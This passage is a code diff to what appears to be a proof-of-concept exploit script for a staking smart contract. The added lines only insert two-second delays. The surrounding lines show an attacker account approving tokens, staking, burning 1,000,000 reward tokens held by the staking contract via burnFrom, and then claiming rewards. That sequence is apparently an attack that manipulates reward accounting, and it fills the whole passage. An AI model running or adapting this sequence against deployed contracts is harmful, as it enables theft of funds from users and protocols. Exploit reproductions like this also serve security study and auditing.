@@ -83,11 +83,17 @@ async function main() {
     console.log("   ## APPROVING STAKING CONTRACT TO USER OUR STAKING TOKENS");
     await stakingTokenContract.connect(attacker).approve(stakingContract.address, ethers.constants.MaxUint256);
 
+    //Since timestamps are used for calculations in the next function, it is safer to wait a while if we are running on localhost, otherwise they might be the same and the calculations will fail
+    await new Promise(r => setTimeout(r, 2000));
+
     console.log("   ## STAKING");
     await stakingContract.connect(attacker).stake(newAttackerStakingTokenBalance);
 
     console.log("   ## BURNING");
     await rewardContract.connect(attacker).burnFrom(stakingContract.address, ethers.utils.parseEther("1000000"));
+
+    //Since timestamps are used for calculations in the next function, it is safer to wait a while if we are running on localhost, otherwise they might be the same and the calculations will fail
+    await new Promise(r => setTimeout(r, 2000));
 
     console.log("   ## GETTING REWARDS");
     await stakingContract.connect(attacker).getReward();
